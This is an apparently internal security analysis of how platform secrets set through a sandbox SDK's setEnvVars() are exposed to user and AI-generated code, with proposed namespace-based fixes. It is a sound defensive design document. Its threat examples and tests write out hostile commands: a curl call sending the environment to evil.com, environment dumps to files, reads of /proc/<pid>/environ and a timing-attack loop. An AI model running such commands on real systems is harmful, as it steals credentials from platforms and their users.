# Environment Variables Security Isolation Analysis

## Executive Summary

The Cloudflare Sandbox SDK currently has a critical security vulnerability where platform-level secrets (API keys, database credentials, etc.) set via `setEnvVars()` are accessible to all user code running in the sandbox. Through extensive testing, we discovered that production environments already have all necessary Linux capabilities to implement complete isolation.

**Critical Discovery**: Production Cloudflare Containers have full Linux capabilities including CAP_SYS_ADMIN, enabling us to build namespace-based isolation TODAY without platform changes.

**The Vulnerability**: Any environment variable set through `setEnvVars()` becomes accessible to ALL code executed in the container - user code, AI-generated code, and third-party dependencies can all read platform secrets.

**The Solution**: Using production's CAP_SYS_ADMIN capability, we can create isolated namespaces where platform operations run with credentials completely invisible to user code. This provides kernel-enforced security boundaries.

## Problem Statement

### Context
The Cloudflare Sandbox SDK enables developers to create platforms where end users can execute code in isolated environments. A common use case is AI-powered development platforms where users prompt AI agents to generate and run applications.

### The Two-Persona Challenge

#### Persona 1: Platform Developer
- Building a service using the Sandbox SDK
- Needs to provide secrets/credentials for platform functionality
- Examples of required secrets:
  - Cloudflare R2 keys for template storage
  - Database credentials for platform data
  - API keys for third-party services
  - Authentication tokens for internal services

#### Persona 2: End User
- Using the platform to generate/run code via AI agents
- Has implicit remote code execution within the sandbox
- Should NOT have access to platform-level secrets
- May legitimately need their own environment variables

### The Security Gap

When using `setEnvVars()` method:
```typescript
await sandbox.setEnvVars({
  CLOUDFLARE_R2_KEY: "secret-key",    // Platform secret
  DATABASE_URL: "postgresql://...",    // Platform secret
  API_KEY: "platform-api-key"         // Platform secret
});
```

These variables become accessible to ALL code running in the container, including:
- User-generated code
- AI-generated code on behalf of the user
- Any process spawned within the sandbox

Attack vector example:
```javascript
// User asks AI: "Create an app that shows system information"
// AI generates (innocently or maliciously):
console.log(process.env);  // Exposes ALL environment variables
```

## Deep Dive: Why This Matters

### Real-World Scenarios

1. **Template Management Platform**
   - Platform stores application templates in R2
   - Needs R2 credentials to fetch templates for users
   - User code shouldn't access R2 directly

2. **Database-Backed Development Environment**
   - Platform tracks user projects, saves states
   - Needs database credentials for platform operations
   - User code shouldn't have direct database access

3. **API Gateway Services**
   - Platform provides managed API access
   - Uses API keys for rate limiting, billing
   - User code should go through platform's API layer, not direct access

4. **AWS Deployment Platform** (Critical Use Case)
   - AI generates Lambda functions or infrastructure code
   - Code needs to be packaged and deployed to AWS
   - AWS CLI must run INSIDE container (where files are)
   - AWS CLI requires credentials via env vars or ~/.aws/credentials
   - Cannot modify how AWS CLI works

5. **Database Migration Platform**
   - Platform needs to run migrations through bastion hosts
   - SSH tunnels and database tools need credentials
   - Migration scripts run in container with database access
   - Tools expect standard credential formats

### Trust Boundaries

```
┌─────────────────────────────────────┐
│         Platform Layer              │
│  (Trusted - Has access to secrets)  │
├─────────────────────────────────────┤
│         Sandbox Runtime             │
│  (Semi-trusted - Controlled env)    │
├─────────────────────────────────────┤
│         User Code Layer            │
│  (Untrusted - Should be isolated)   │
└─────────────────────────────────────┘
```

Current issue: No boundary between Platform Layer and User Code Layer within the sandbox.

## Threat Model

### Direct Attacks
1. **Intentional Exfiltration**: User explicitly tries to steal secrets
2. **Social Engineering**: User tricks AI into revealing secrets
3. **Prompt Injection**: Crafted prompts that make AI expose environment

### Indirect Risks
1. **Accidental Exposure**: Legitimate debugging code that logs environment
2. **Dependency Vulnerabilities**: Third-party packages that collect env vars
3. **Error Messages**: Stack traces that include environment context
4. **AI Hallucination**: AI mistakenly includes env vars in generated code

## Technical Constraints

### Current SDK Limitations
1. `setEnvVars()` must be called immediately after `getSandbox()`
2. Environment variables cannot be changed once sandbox starts
3. All processes in the container share the same environment
4. No native secret management or isolation mechanism

### Container Environment
- Single container instance per sandbox
- All processes share the same Linux namespace
- Environment variables are process-wide, inherited by children
- **We control the bun server** at `/container_src/index.ts` that handles all operations
- The bun server acts as our control plane between Worker/DO and user code

### Tool Integration Reality
- **Third-party tools (AWS CLI, gcloud, terraform, etc.) cannot be modified**
- These tools expect credentials in standard locations:
  - Environment variables (AWS_ACCESS_KEY_ID, GOOGLE_APPLICATION_CREDENTIALS)
  - Config files (~/.aws/credentials, ~/.config/gcloud)
  - Cannot be instructed to use custom credential providers
- **Container code is arbitrary** - any language, any framework
- **AI models don't know about platform-specific patterns**
- **Everything runs in the same process namespace**

## Requirements for a Solution

### Must Have
1. **Secret Isolation**: Platform secrets NEVER accessible to user code
2. **Platform Functionality**: Platform code can still access required secrets
3. **Backward Compatibility**: Existing SDK usage shouldn't break
4. **Developer Experience**: Simple, intuitive API for developers
5. **Security by Default**: Hard to accidentally expose secrets

### Nice to Have
1. **Granular Permissions**: Different secrets for different operations
2. **Audit Trail**: Log secret access attempts
3. **Rotation Support**: Change secrets without restarting sandbox
4. **User Variables**: Safe way for users to provide their own env vars
5. **Multiple Security Contexts**: Different trust levels within same sandbox

## Potential Attack Surfaces to Consider

### Code Execution Paths
- Direct `exec()` commands
- Process spawning via `startProcess()`
- Code interpreter (Python/JavaScript contexts)
- Git operations that might execute hooks
- Package installation scripts (npm install, pip install)
- Build processes that might read environment

### Information Leakage Vectors
- Standard output/error streams
- File system (writing env to files)
- Network requests (sending env to external services)
- Process inspection (/proc filesystem)
- Shell expansion and interpolation
- Debugging interfaces


## Success Criteria

A successful solution should:
1. Completely prevent user code from accessing platform secrets
2. Maintain full platform functionality
3. Be transparent to end users
4. Be easy for developers to implement correctly
5. Fail securely (deny by default)
6. Support common use cases without complexity
7. Not significantly impact performance

## Current Implementation Analysis

### How `setEnvVars()` Works Today

1. **Setting Environment Variables** (`sandbox.ts:86-89`):
```typescript
async setEnvVars(envVars: Record<string, string>): Promise<void> {
  this.envVars = { ...this.envVars, ...envVars };
  console.log(`[Sandbox] Updated environment variables`);
}
```

2. **Command Execution** (`container_src/handler/exec.ts:20`):
```typescript
env: options.env ? { ...process.env, ...options.env } : process.env
```

3. **Process Spawning** (`container_src/handler/process.ts:76`):
```typescript
env: { ...process.env, ...options.env }
```

### The Security Vulnerability

When `setEnvVars()` is called, the provided variables become part of the container's `process.env`. These are then:
1. Inherited by ALL spawned processes via Node.js `spawn()`
2. Accessible to any code running in the container
3. Available through multiple execution paths:
   - `exec()` commands
   - `startProcess()` background processes
   - Code interpreter sessions (Python/JavaScript)
   - Git operations that might run hooks
   - Package installation scripts

### Attack Demonstration

```typescript
// Platform developer sets secrets
await sandbox.setEnvVars({
  CLOUDFLARE_R2_KEY: "secret-r2-key",
  DATABASE_URL: "postgresql://user:pass@host/db"
});

// User/AI can now access these secrets
await sandbox.exec("echo $CLOUDFLARE_R2_KEY");  // Outputs: secret-r2-key
await sandbox.runCode("import os; print(os.environ)", { language: 'python' });  // Shows all env vars
await sandbox.exec("node -e 'console.log(process.env)'");  // Full environment dump
```

### Architecture Flow

```
Worker (Platform Layer)
    ↓ setEnvVars()
Durable Object (Sandbox)
    ↓ stores in this.envVars
Container (Execution Layer)
    ↓ merges with process.env
Spawned Processes (User Code)
    ↓ inherits full environment
All Code Has Access ⚠️
```

### Why This is Critical

1. **No Isolation Boundary**: The same environment variables are shared across all trust levels
2. **Ambient Authority**: Secrets are available ambiently - code doesn't need to explicitly request them
3. **Multiple Access Vectors**: Many ways to access environment (direct, indirect, accidental)
4. **Persistent Exposure**: Once set, secrets remain accessible for the container's lifetime
5. **No Audit Trail**: No way to track or control which code accesses secrets

## Design Considerations

### Cloudflare Platform Capabilities

1. **Worker ↔ Durable Object Boundary**:
   - Workers can make RPC calls to Durable Objects
   - Could potentially act as a security boundary
   - Platform operations could stay in Worker layer

2. **Container Isolation**:
   - Containers run in isolated environments
   - But no sub-process isolation within a container
   - All processes share the same Linux namespace

3. **RPC Communication**:
   - All sandbox methods are RPC calls
   - Could introduce proxy methods for privileged operations
   - Authentication/authorization could be added at RPC layer


## Our Leverage: Container Control

### What We Control
We have significant leverage through our bun server that runs as the container's control plane:

1. **The base Docker image** - We provide the foundation all developers build on
2. **The bun server** (`/container_src/index.ts`) - Mediates ALL operations:
   - Command execution (`/api/execute`)
   - File operations (`/api/write`, `/api/read`)
   - Process management (`/api/process/*`)
   - Port forwarding (`/api/expose-port`)
3. **The communication channel** - All Worker↔Container communication goes through our server

### Solutions We Can Build Today

#### In-Memory Credential Vault
```typescript
// In our bun server - credentials never touch process.env
class CredentialVault {
  private secrets = new Map<string, string>();
  private accessLog: AccessRecord[] = [];
  
  // Store credentials encrypted in memory
  store(creds: Record<string, string>) {
    for (const [key, value] of Object.entries(creds)) {
      this.secrets.set(key, encrypt(value));
    }
  }
  
  // Execute with just-in-time injection
  async execWithCreds(command: string, credKeys: string[], timeout: number) {
    const creds = {};
    credKeys.forEach(key => {
      creds[key] = decrypt(this.secrets.get(key));
    });
    
    // THE CRITICAL MOMENT - credentials briefly visible
    const proc = spawn(command, {
      env: { ...process.env, ...creds },
      timeout
    });
    
    // Log access for audit
    this.accessLog.push({ command, credKeys, timestamp: Date.now() });
    
    return await collectOutput(proc);
  }
}
```

**Pros:**
- Credentials never in global environment
- Audit trail of all credential access
- Can rotate credentials without restart
- Scoped access per operation

**Cons:**
- Still exposed during execution in `/proc/[pid]/environ`
- User code could read memory via `/proc/[bun-pid]/mem`
- Child processes inherit credentials
- Vulnerable to timing attacks

## Alternative Approaches Considered (Before Discovery)

### 1. LD_PRELOAD Injection
```c
// Intercept getenv() calls at libc level
char* getenv(const char* name) {
  if (is_credential(name) && !is_authorized_process()) {
    return NULL;
  }
  return original_getenv(name);
}
```
**Verdict:** Complex, can be bypassed by static linking. No longer needed with namespace isolation.

### 2. FUSE Virtual Filesystem
```typescript
// Mount virtual ~/.aws/credentials that checks caller
fuseMount('~/.aws/credentials', {
  read: (pid) => isAuthorized(pid) ? getCredentials() : ""
});
```
**Verdict:** We thought we lacked privileges, but with CAP_SYS_ADMIN we could actually do this.

### 3. Sidecar Credential Service
```typescript
// Separate process holds credentials, accessed via socket
const creds = await fetch('http://unix:/tmp/creds.sock/aws-key');
```
**Verdict:** Requires wrapping every CLI tool. Namespaces provide better isolation.

### 4. Time-Based Credential Files
```typescript
// Write credentials with immediate deletion
await writeFile(credFile, creds, { mode: 0o600 });
setTimeout(() => unlink(credFile), 100); // Delete after 100ms
```
**Verdict:** Race conditions, still readable briefly. Namespaces eliminate the window entirely.




## Migration Path

### Phase 1: Immediate (Week 1)
1. **Build namespace isolation POC** using production CAP_SYS_ADMIN
2. **Test with real credentials** in isolated namespaces
3. **Document the new security model** for early adopters

### Phase 2: SDK Enhancement (Week 2-3)  
1. **Add deprecation warning** to `setEnvVars()` for sensitive-looking keys
2. **Introduce new secure methods**:
   - `execInIsolation()` - Run commands in isolated namespace with credentials
   - `setUserEnvVars()` - Safe environment variables for user code
   - `registerPlatformCallback()` - RPC callbacks for platform operations
3. **Update all examples** to use secure patterns

### Phase 3: General Availability (Week 4+)
1. **Release updated SDK** with namespace isolation
2. **Compatibility mode** - Support both patterns during transition
3. **Migration guide** with step-by-step instructions
4. **Breaking change** (3-6 months) - Remove insecure `setEnvVars()` for secrets

## Security Checklist

Before implementing, ensure:
- [ ] Secrets never accessible to user code
- [ ] Platform operations are authenticated/authorized
- [ ] Audit logging for all secret access attempts
- [ ] Clear documentation of security boundaries
- [ ] Secure by default - hard to misuse
- [ ] Performance impact is acceptable
- [ ] Migration path for existing users

## Edge Cases & Additional Considerations

### Complex Attack Vectors

#### 1. Transitive Dependencies
```javascript
// User installs a package that reads env vars
await sandbox.exec('npm install some-package');
// Package's postinstall script could access secrets
```

**Mitigation**: Run package installations in restricted environment

#### 2. File System Persistence
```javascript
// User writes secrets to file
await sandbox.exec('env > /tmp/secrets.txt');
// Later reads them back
await sandbox.readFile('/tmp/secrets.txt');
```

**Mitigation**: File system isolation or periodic cleanup

#### 3. Network Exfiltration
```javascript
// User sends secrets to external server
await sandbox.exec('curl https://evil.com -d "$(env)"');
```

**Mitigation**: Network egress filtering, allowlisting

#### 4. Timing Attacks
```javascript
// User infers secret length/content through timing
for (let i = 0; i < 100; i++) {
  const start = Date.now();
  await sandbox.exec(`if [ "$SECRET" = "${guess}" ]; then sleep 1; fi`);
  const timing = Date.now() - start;
  // Analyze timing...
}
```

**Mitigation**: Rate limiting, execution quotas

### Platform Use Cases to Support

#### 1. Template Fetching from R2
```typescript
// Platform needs R2 credentials to fetch templates
// User shouldn't access R2 directly
interface TemplateService {
  fetchTemplate(id: string): Promise<Buffer>;
  listTemplates(): Promise<Template[]>;
}
```

#### 2. Database Operations
```typescript
// Platform tracks usage, stores metadata
// User shouldn't have direct DB access
interface MetadataService {
  saveProject(data: ProjectData): Promise<void>;
  getUsage(userId: string): Promise<Usage>;
}
```

#### 3. External API Integration
```typescript
// Platform uses API keys for services
// User gets proxied/limited access
interface AIService {
  complete(prompt: string, model: string): Promise<Response>;
  // Rate limited, usage tracked per user
}
```

### Performance Implications

#### Latency Analysis
- **Current**: Direct env var access (~0ms)
- **Proxy Pattern**: RPC round trip (~5-10ms per operation)
- **Secret Service**: Network request (~20-50ms per secret fetch)
- **Platform SDK**: API call (~30-100ms depending on operation)

#### Optimization Strategies
1. **Batching**: Group platform operations
2. **Caching**: Cache non-sensitive results
3. **Preloading**: Anticipate needed operations
4. **Async Operations**: Non-blocking where possible

### Backward Compatibility Strategy

#### Phase 1: Detection & Warning (Non-breaking)
```typescript
async setEnvVars(vars: Record<string, string>) {
  const sensitiveKeys = Object.keys(vars).filter(k => 
    k.includes('KEY') || k.includes('SECRET') || 
    k.includes('TOKEN') || k.includes('PASSWORD')
  );
  
  if (sensitiveKeys.length > 0) {
    console.warn(
      '[SECURITY WARNING] Setting potentially sensitive environment variables. ' +
      'Consider using setPlatformSecrets() or platform operations instead. ' +
      'See: https://docs.example.com/security'
    );
  }
  
  // Continue with current behavior
  this.envVars = { ...this.envVars, ...vars };
}
```

#### Phase 2: Opt-in Security (Breaking for opt-in users)
```typescript
interface SandboxOptions {
  secureMode?: boolean; // Default false for compatibility
}

async setEnvVars(vars: Record<string, string>) {
  if (this.options.secureMode) {
    throw new Error(
      'setEnvVars() is disabled in secure mode. ' +
      'Use setUserEnvVars() for non-secrets or platform operations for secrets.'
    );
  }
  // Legacy behavior
}
```

#### Phase 3: Secure by Default (Breaking change)
```typescript
// Remove setEnvVars() entirely
// Only allow:
async setUserEnvVars(vars: Record<string, string>) {
  // Validate no sensitive-looking keys
  // Set only in user context
}

async setPlatformConfig(config: PlatformConfig) {
  // Platform-specific configuration
  // Not accessible to user code
}
```

### Testing Strategy

#### Security Test Suite (Updated for Namespace Isolation)
```typescript
describe('Namespace-Based Security', () => {
  test('Isolated namespace cannot access platform secrets', async () => {
    // Run platform operation with credentials in isolated namespace
    const platformResult = await sandbox.execInIsolation(
      'aws s3 ls', 
      { AWS_ACCESS_KEY_ID: 'secret-key' }
    );
    
    // User code in main namespace cannot see credentials
    const userResult = await sandbox.exec('echo $AWS_ACCESS_KEY_ID');
    expect(userResult.stdout).toBe('');
    
    // User code cannot see platform process
    const ps = await sandbox.exec('ps aux | grep aws');
    expect(ps.stdout).not.toContain('aws s3 ls');
  });
  
  test('Cross-namespace /proc access is blocked', async () => {
    const isolated = await sandbox.execInIsolation(
      'sleep 30',
      { SECRET: 'platform-secret' }
    );
    
    // Try to read from main namespace
    const steal = await sandbox.exec(`cat /proc/${isolated.pid}/environ`);
    expect(steal.exitCode).not.toBe(0); // Should fail - different namespace
  });
  
  test('Package installations cannot access isolated credentials', async () => {
    // Platform operations in isolated namespace
    await sandbox.execInIsolation(
      'npm run deploy',
      { DEPLOY_KEY: 'secret' }
    );
    
    // Malicious package in user namespace
    await sandbox.exec('npm install malicious-package');
    // Package cannot access DEPLOY_KEY - different namespace
  });
});
```

### Documentation Requirements

#### Security Guide
- Clear explanation of the security model
- Examples of secure vs insecure patterns
- Migration guide from old to new API
- Common pitfalls and how to avoid them

#### API Reference
- Detailed documentation of each method
- Security implications clearly marked
- Code examples for each use case
- Performance characteristics

### Monitoring & Compliance

#### Audit Events to Track
1. Secret setting operations
2. Platform operation invocations
3. Failed access attempts
4. Suspicious patterns (rapid env queries)

#### Metrics to Monitor
- Platform operation latency
- Secret access frequency
- Security warning occurrences
- Migration adoption rate


## Real-World Tool Integration Challenge

### The Fundamental Problem

Many platform operations require third-party CLI tools that:
1. **Must run inside the container** (where the files and code are)
2. **Need real credentials** to function
3. **Cannot be modified** to use custom auth mechanisms
4. **Read credentials from standard locations** (env vars or config files)

### Example: AWS Deployment Workflow

```typescript
// What platforms need to do:
// 1. AI generates Lambda function code
await sandbox.writeFile('/app/lambda.js', aiGeneratedCode);

// 2. Package the code (must happen in container)
await sandbox.exec('zip function.zip lambda.js node_modules/**');

// 3. Deploy to AWS (needs AWS CLI with credentials)
await sandbox.exec('aws lambda update-function-code --function-name my-func --zip-file fileb://function.zip');
// ⚠️ AWS CLI needs AWS_ACCESS_KEY_ID in environment!

// 4. Run database migrations through bastion
await sandbox.exec('aws ssm start-session --target i-bastion --document AWS-StartPortForwardingSession');
await sandbox.exec('npm run db:migrate');
// ⚠️ Both commands need AWS credentials!
```

### Why Current Solutions Fall Short

| Solution | Why It Doesn't Work for CLI Tools |
|----------|------------------------------------|
| **Platform Proxy** | Can't proxy AWS CLI - it needs creds in container |
| **Worker Orchestration** | Can't use AWS CLI from Worker - files are in container |
| **Temporary Credentials** | Still exposed to user code during operation |
| **Capability Tokens** | AWS CLI doesn't understand our tokens |
| **SDK Pattern** | Can't rewrite every CLI tool |

## Practical Workarounds (Current State)

### 1. Hybrid Orchestration (Partial Security)
```typescript
// Do what you can in Worker, accept risks for what you can't
class PlatformDeployer {
  async deployToAWS(sandbox: Sandbox, userId: string) {
    // Safe: Package in container without secrets
    await sandbox.exec('zip function.zip *.js');
    
    // Safe: Pull package to Worker
    const pkg = await sandbox.readFile('/app/function.zip');
    
    // Safe: Deploy from Worker using SDK
    const lambda = new AWS.Lambda({
      credentials: this.awsCredentials
    });
    await lambda.updateFunctionCode({
      FunctionName: 'my-func',
      ZipFile: pkg.content
    }).promise();
    
    // RISKY: When CLI is unavoidable, use minimal scoped temp creds
    const tempCreds = await this.createScopedTempCredentials({
      duration: 300, // 5 minutes
      permissions: ['s3:GetObject'],
      resources: ['arn:aws:s3:::templates/*']
    });
    
    await sandbox.setEnvVars(tempCreds);
    await sandbox.exec('aws s3 cp s3://templates/base.yaml .');
    // ⚠️ Credentials exposed for 5 minutes
  }
}
```

### 2. Tooling Wrapper Scripts (Defense in Depth)
```typescript
// Create wrapper scripts that limit credential exposure
await sandbox.writeFile('/app/deploy.sh', `
#!/bin/bash
set -e
# Clear history
export HISTFILE=/dev/null
# Run operation
aws lambda update-function-code "$@"
# Immediately clear credentials
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
exit $?
`);

await sandbox.exec('chmod +x deploy.sh');
await sandbox.exec('./deploy.sh --function-name my-func --zip-file fileb://function.zip');
```

### 3. Separate Deployment Service (Most Secure)
```typescript
// Don't deploy from sandbox at all - use separate service
class DeploymentService {
  async deploy(sandbox: Sandbox, userId: string) {
    // Package in sandbox
    await sandbox.exec('npm run build');
    await sandbox.exec('zip -r package.zip dist/');
    
    // Upload to staging area
    const pkg = await sandbox.readFile('/app/package.zip');
    const stagingUrl = await this.uploadToStaging(pkg.content);
    
    // Trigger deployment service (runs outside sandbox)
    await fetch('https://deploy-service.internal/deploy', {
      method: 'POST',
      body: JSON.stringify({
        userId,
        packageUrl: stagingUrl,
        target: 'production'
      }),
      headers: {
        'Authorization': `Bearer ${this.deployServiceToken}`
      }
    });
  }
}
```

## Recommendations Summary (Updated with Production Capabilities)

### Immediate (This Week) - We Can Build Today!
1. **Implement namespace isolation** using production CAP_SYS_ADMIN
2. **Create secure execution API** in bun server for isolated commands
3. **Build credential vault** that never touches global environment
4. **Test with real AWS/GCP deployments** in production

### Short Term (Next 2 Weeks)
1. **Formalize SDK API** for namespace operations
2. **Add cgroup isolation** using available v2 delegation
3. **Create migration tools** for existing users
4. **Document security best practices**

### Medium Term (Month 2)
1. **Release production-ready SDK** with full isolation
2. **Build RPC callback system** for platform operations
3. **Add comprehensive audit logging**
4. **Create example implementations** for common platforms

### No Longer Needed (We Have Capabilities!)
1. ~~Request CAP_SYS_ADMIN from Cloudflare~~ ✅ Already available
2. ~~Wait for platform changes~~ ✅ Can build today
3. ~~Investigate workarounds~~ ✅ Have proper solution

## Platform Research Findings

### Key Discoveries from Cloudflare Architecture

#### 1. Container Class Architecture
The `@cloudflare/containers` package provides:
- Base `Container` class that extends `DurableObject`
- Automatic container lifecycle management
- Built-in environment variable support via `envVars` property
- Container runs in separate process, all env vars inherited

#### 2. RPC Capabilities
**Critical Finding**: Cloudflare RPC supports passing **functions as parameters**!
- Functions can be passed from Worker to Durable Object
- The DO can call back to the Worker through these functions
- This enables true bidirectional communication
- RpcTarget class enables returning objects with methods

#### 3. Communication Patterns
- **E-order semantics**: Calls to same DO are guaranteed ordered
- **Promise pipelining**: Can chain calls without awaits for efficiency
- **Stub management**: Each stub maintains its own connection
- **Functions as callbacks**: DO can invoke Worker functions passed as params

### Architectural Implications for Our Solution

#### Perfect Fit: Platform Operations Proxy
The RPC callback capability makes our recommended solution viable:

```typescript
// Worker - holds secrets
class PlatformWorker {
  async fetch(request, env) {
    const sandbox = getSandbox(env.Sandbox, "user-sandbox");
    
    // Pass a callback function to the DO!
    await sandbox.registerPlatformCallback(async (operation, params) => {
      // This runs in the Worker, with access to secrets!
      switch(operation) {
        case 'fetch-template':
          return await env.R2.get(`templates/${params.id}`);
        case 'db-query':
          return await env.DB.prepare(params.query).run();
      }
    });
    
    // User code runs without access to secrets
    await sandbox.exec("npm start");
  }
}

// Durable Object - no secrets
class SecureSandbox extends Container {
  private platformCallback?: Function;
  
  async registerPlatformCallback(callback: Function) {
    this.platformCallback = callback;
  }
  
  async executePlatformOp(op: string, params: any) {
    if (!this.platformCallback) {
      throw new Error("No platform callback registered");
    }
    // Call back to the Worker!
    return await this.platformCallback(op, params);
  }
}
```

### Container Environment Variables Flow

```
Worker.setEnvVars() 
  → Sandbox.envVars (DO property)
  → Container.envVars (inherited from DO)
  → process.env (in container)
  → All spawned processes inherit
```

The Container class directly sets environment variables that become part of `process.env`, making isolation within the container impossible without modifying the container implementation.

### Why Other Approaches Won't Work

1. **Dual Contexts Within Container**: Would require modifying container handler code
2. **Secret Service**: Still exposes secrets temporarily in container env
3. **Capability-Based**: Would need container changes for enforcement

### Performance Considerations

- RPC round-trip: ~5-10ms (acceptable for platform operations)
- Function callbacks add minimal overhead
- Can batch operations to reduce round trips
- Promise pipelining can optimize sequential calls


## What We Can Build in the SDK

Leveraging our control of the bun server, we can implement:

### 1. Secure Execution API
```typescript
// New SDK methods that use our container control
interface SecureSandbox extends Sandbox {
  // Register credentials with container vault (never in env)
  async registerCredentials(creds: Record<string, string>): Promise<void>;
  
  // Execute with just-in-time credential injection
  async execSecure(command: string, options: {
    credentials: string[],  // Which credentials to inject
    timeout: number,        // Max execution time
    isolated?: boolean      // Hide from process list
  }): Promise<ExecResult>;
}

// Implementation in bun server
app.post('/api/secure/exec', async (req) => {
  const { command, credentials, timeout } = req.body;
  
  // Get from vault, not env
  const creds = vault.getCredentials(credentials);
  
  // Create isolated process
  const proc = spawn(command, {
    env: { ...cleanEnv, ...creds },
    detached: true,  // Separate process group
    timeout
  });
  
  // Hide from user's process list
  hiddenProcesses.add(proc.pid);
  
  return collectOutput(proc);
});
```

### 2. Credential Vault in Container
```typescript
// New endpoint in container_src/index.ts
case "/api/vault/store":
  // Store encrypted in memory, never in env
  credentialVault.store(await req.json());
  break;

case "/api/vault/exec":
  // Execute with vaulted credentials
  const { command, credKeys, timeout } = await req.json();
  return await credentialVault.execWithCreds(command, credKeys, timeout);
```

### 3. Process Isolation Techniques
```typescript
// Hide platform processes from user code
case "/api/process/list":
  // Filter out hidden platform processes
  const userProcesses = processes.filter(p => !hiddenProcesses.has(p.pid));
  return Response.json({ processes: userProcesses });
```

## Production Environment Capabilities Testing

### Testing Methodology
We deployed a comprehensive security testing worker to both local and production environments to determine actual Linux capabilities available in Cloudflare Containers.

### Test Results Summary

| Feature | Local Environment | Production Environment | Impact |
|---------|------------------|------------------------|--------|
| **CAP_SYS_ADMIN** | ❌ Not Available | ✅ **Available** | Can create namespaces for isolation |
| **PID Namespace** | ❌ Not Available | ✅ **Available** | Can hide processes from user code |
| **Mount Namespace** | ❌ Not Available | ✅ **Available** | Can isolate filesystems |
| **Network Namespace** | ❌ Not Available | ✅ **Available** | Can isolate network access |
| **User Namespace** | ❌ Not Available | ✅ **Available** | Can map different user permissions |
| **Cgroup Delegation** | ❌ Not Available | ✅ **Available** | Can create isolated resource groups |
| **CAP_SYS_PTRACE** | ❌ Not Available | ✅ **Available** | Can debug and trace processes |
| **Seccomp Mode** | 2 (Filtered) | 0 (Disabled) | No syscall filtering in production |
| **Environment Exposure** | ⚠️ Exposed | ⚠️ Exposed | Current implementation exposes all secrets |

### Production Capabilities (Raw Output)
```
CapInh: 000001ffffffffff
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

### Key Discovery
Production containers have **full Linux capabilities** (`000001ffffffffff`), including CAP_SYS_ADMIN. This means we can implement complete namespace-based isolation TODAY without waiting for platform changes. The local development environment intentionally restricts capabilities for safety.

### Verified Attack Vectors
Testing confirmed that with the current SDK implementation:
- Environment variables set via `setEnvVars()` are accessible to all code
- Any process can read other processes' `/proc/[pid]/environ`
- Python and Node.js subprocesses inherit all environment variables
- Cross-process credential theft is trivial

## What We Can Build Today in Production

### Understanding the Architecture Layers

```
┌─────────────────────────────────────┐
│         Your Worker Code            │ <- You control (your code)
├─────────────────────────────────────┤
│         Durable Object              │ <- You control (extends Container class)
├─────────────────────────────────────┤
│      Docker Container               │ <- You control (Dockerfile)
│   ┌──────────────────────┐          │
│   │   Ubuntu 22.04       │          │
│   │   + Your bun server  │          │
│   │   + AI agent         │          │
│   │   + User code        │          │
│   └──────────────────────┘          │
├─────────────────────────────────────┤
│      Container Runtime              │ <- CLOUDFLARE CONTROLS (gVisor/Firecracker)
│   (Security policies, capabilities) │    Production has everything we need!
├─────────────────────────────────────┤
│              VM (KVM)               │ <- Cloudflare controls
├─────────────────────────────────────┤
│         Physical Server             │ <- Cloudflare controls
└─────────────────────────────────────┘
```

### Update: No Fundamental Limitation in Production!

Our testing revealed a critical difference between local and production environments:

```bash
# Local Development (Restricted for safety):
$ capsh --print
Bounding set = cap_chown,cap_net_bind_service,...
# MISSING: cap_sys_admin - Can't create namespaces locally

# Production (Full capabilities!):
$ cat /proc/self/status | grep Cap
CapEff: 000001ffffffffff  # ALL capabilities including CAP_SYS_ADMIN!

$ unshare --pid --fork echo "SUCCESS"
SUCCESS  # ✅ Works in production!

# We CAN create isolated namespaces in production:
$ unshare --pid --mount --net --fork /bin/bash
# Now in isolated namespace - user code can't see us!
```

**Key Insight**: Production has everything we need for complete isolation. Local development is intentionally restricted for developer safety.

### Linux Security Primitives Explained (Already Available in Production!)

#### 1. CAP_SYS_ADMIN - "The Namespace Creator"

**What it is:** A Linux capability that allows creating isolated namespaces (like containers within containers).

**In Simple Terms:** Think of it like creating separate universes within your container:
```
Current Reality (No CAP_SYS_ADMIN):
Container = One big shared room
├── AI Agent (has AWS credentials in env)
├── User Code (can see AI Agent's env)
└── AWS CLI (needs credentials from env)
Everyone sees everything! 🚨

With CAP_SYS_ADMIN:
Container = Multiple isolated rooms
├── Room 1: AI Agent + AWS CLI
│   ├── Has AWS credentials
│   └── Invisible to Room 2
└── Room 2: User Code
    ├── Cannot see Room 1's env
    └── Cannot even detect Room 1 exists
```

**Technical Details:**
```c
// What CAP_SYS_ADMIN enables:
unshare(CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWNET);
// Creates new:
// - PID namespace (process isolation)
// - Mount namespace (filesystem isolation)  
// - Network namespace (network isolation)
```

**Real-World Example:**
```typescript
// In our bun server (if we had CAP_SYS_ADMIN):
async function runAIAgentSecurely() {
  const { pid } = fork();
  if (pid === 0) {
    // Create isolated namespace
    unshare(CLONE_NEWPID | CLONE_NEWNS);
    
    // Only THIS namespace has AWS credentials
    process.env.AWS_ACCESS_KEY_ID = vault.getSecret('aws_key');
    process.env.AWS_SECRET_ACCESS_KEY = vault.getSecret('aws_secret');
    
    // Run AI agent - it can use AWS CLI
    exec('python3 ai_agent.py');
    // AI agent can run: os.system('aws lambda deploy')
  }
  
  // User code in parent namespace CANNOT:
  // - See the AI agent process
  // - Read its environment variables
  // - Access AWS credentials
}
```

**Status in Production:** ✅ AVAILABLE - We can create isolated namespaces today!

#### 2. Seccomp Filters - "The System Call Police"

**What it is:** A Linux security feature that filters system calls, blocking dangerous operations.

**In Simple Terms:** Like a bouncer that checks every request to the Linux kernel:
```
Current Reality (Default Seccomp):
User Code: "Show me process 1234's environment variables"
Linux Kernel: "Sure, here's AWS_ACCESS_KEY_ID=secret123"
User Code: "Thanks!" *steals credentials* 😈

With Custom Seccomp Filters:
User Code: "Show me process 1234's environment variables"
Seccomp Filter: "Is process 1234 yours?"
User Code: "No, it's the AI agent's process"
Seccomp Filter: "ACCESS DENIED" 🚫
```

**Technical Details:**
```c
// Custom seccomp filter we need:
struct sock_filter filter[] = {
  // Check if syscall is 'open'
  BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),
  BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_open, 0, 1),
  
  // Check if opening /proc/*/environ
  // Block if not the process's own environ
  BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, args[0])),
  // Custom logic to check PID ownership
  
  // Allow or deny
